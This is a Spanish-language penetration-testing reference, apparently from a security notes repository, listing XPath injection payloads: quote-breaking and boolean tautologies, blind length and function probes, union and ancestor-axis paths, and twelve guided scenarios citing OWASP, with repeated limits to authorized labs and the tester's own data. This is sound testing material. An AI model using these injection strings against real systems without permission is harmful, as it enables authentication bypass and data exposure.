# 🗡️ XPath injection: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Comillas y booleanos de control

```text
'
"
prueba' or '1'='1
prueba' or '1'='2
```

**Cuándo usarlo:** Un valor por request. Las dos últimas asumen un predicado con comilla simple, como [name='...']; comparar nodos propios y no solo errores.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection/).


### Predicado numérico

```xpath
1 or 1=1
1 or 1=2
1 and 1=1
1 and 1=2
```

**Cuándo usarlo:** Fragmentos alternativos para un contexto numérico no entrecomillado. El resultado depende de cómo la aplicación arme la expresión.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection/).


## 🧭 Payloads por contexto

### Funciones XPath 1.0 sobre marcador propio

```xpath
prueba' or starts-with(name,'prueba') or 'a'='b
prueba' or contains(name,'prueba-123') or 'a'='b
prueba' or string-length(name)=10 or 'a'='b
```

**Cuándo usarlo:** Cada línea presupone que el valor cae dentro de comillas simples en un predicado; adaptar nombre de nodo y longitud a XML propio.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection/).


### Expresiones completas en XML de laboratorio

```xpath
//item[name='prueba-123']
//item[starts-with(name,'prueba-')]
count(//item[name='prueba-123'])
boolean(//item[name='prueba-123'])
```

**Cuándo usarlo:** Son expresiones completas de referencia, una por evaluación. No confundir capacidad normal del evaluador con entrada inyectable.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection/).


## 🔥 Payloads avanzados

### Pares ciegos por longitud controlada

```xpath
//item[name='prueba-123' and string-length(name)=10]
//item[name='prueba-123' and string-length(name)=11]
```

**Cuándo usarlo:** Usar documento propio con nombre de longitud conocida; diferencia repetible requiere que la entrada controle la expresión, no solo datos.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection/).


## 🔬 Pruebas guiadas por escenario

### 1. Comilla simple de diagnóstico

**Objetivo:** El parámetro se inserta en una cadena XPath delimitada por comillas simples.

```text
prueba'
```

**Interpretación:** Un error del parser es pista, no explotación; comparar con cadena válida.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/09-XPath_Injection/).

### 2. Booleano verdadero

**Objetivo:** Consulta de laboratorio similar a //item[name='ENTRADA'].

```text
prueba' or '1'='1
```

**Interpretación:** Debe alterar selección de nodos propios y no solo el código de respuesta.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/09-XPath_Injection/).

### 3. Booleano falso

**Objetivo:** Control de la variante anterior manteniendo forma sintáctica.

```text
prueba' or '1'='2
```

**Interpretación:** Una diferencia estable verdadero/falso apoya control del predicado.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/09-XPath_Injection/).

### 4. starts-with sobre nodo propio

**Objetivo:** Adaptar XPath al esquema XML del laboratorio; no adivinar datos ajenos.

```text
prueba' or starts-with(//item[@id='own']/name,'prueba') or 'a'='b
```

**Interpretación:** El resultado depende del valor en el nodo propio; comprobar condición falsa cambiando prefijo.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/09-XPath_Injection/).

### 5. contains sobre nodo propio

**Objetivo:** Verificar evaluación de función XPath 1.0.

```text
prueba' or contains(//item[@id='own']/name,'ueba') or 'a'='b
```

**Interpretación:** Contrastar con subcadena imposible para descartar reflexión.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/09-XPath_Injection/).

### 6. string-length

**Objetivo:** Probar un dato de longitud conocida del XML de prueba.

```text
prueba' or string-length(//item[@id='own']/name)=10 or 'a'='b
```

**Interpretación:** Sustituir 10 por longitud real y comparar con 11; no extraer datos ajenos.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/09-XPath_Injection/).

### 7. count de nodos propios

**Objetivo:** Medir selección de nodos de prueba mediante XPath.

```text
prueba' or count(//item[@id='own'])=1 or 'a'='b
```

**Interpretación:** Un resultado distinto requiere control count(...)=2 y observación del nodo devuelto.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/09-XPath_Injection/).

### 8. Predicado entre comillas dobles

**Objetivo:** La consulta original usa `name="ENTRADA"`; dos valores de control de un nodo propio.

```text
prueba" or "1"="1
prueba" or "1"="2
```

**Interpretación:** El cambio verdadero/falso debe modificar el mismo resultado; prueba un contexto distinto al de comillas simples.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/09-XPath_Injection/).

### 9. Unión de rutas XPath

**Objetivo:** Solo cuando el input controla una expresión de ruta completa; dos nodos son del tester.

```xpath
//item[@id='prueba-123'] | //item[@id='prueba-456']
```

**Interpretación:** Si aparecen ambos nodos pese a esperar un solo identificador literal, se interpretó el operador de unión.

**Fuente técnica:** [www.w3.org](https://www.w3.org/TR/1999/REC-xpath-19991116/).

### 10. Selector posicional

**Objetivo:** Usar dos elementos de prueba en un XML de laboratorio cuando el input forma parte de una ruta.

```xpath
item[position()=1]
item[position()=2]
```

**Interpretación:** El selector debe alternar entre los dos nodos conocidos; descartar ordenación de la aplicación.

**Fuente técnica:** [www.w3.org](https://www.w3.org/TR/1999/REC-xpath-19991116/).

### 11. Eje ancestor fuera del subárbol esperado

**Objetivo:** Solo en un XML propio donde `root` es ancestro del item de prueba.

```xpath
//item[@id='prueba-123']/ancestor::root
```

**Interpretación:** Leer el nodo ancestro en vez del item demuestra que la ruta controlada cambia el alcance; no usar datos ajenos.

**Fuente técnica:** [www.w3.org](https://www.w3.org/TR/1999/REC-xpath-19991116/).

### 12. Función matches de XPath 2.0+

**Objetivo:** No aplica a motores XPath 1.0; el nodo de nombre es del laboratorio.

```xpath
matches(string(//item[@id='prueba-123']/name),'^prueba-123$')
```

**Interpretación:** Comparar con patrón imposible; un error de función desconocida indica versión incompatible, no sanitización.

**Fuente técnica:** [www.w3.org](https://www.w3.org/TR/xpath-functions/#func-matches).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
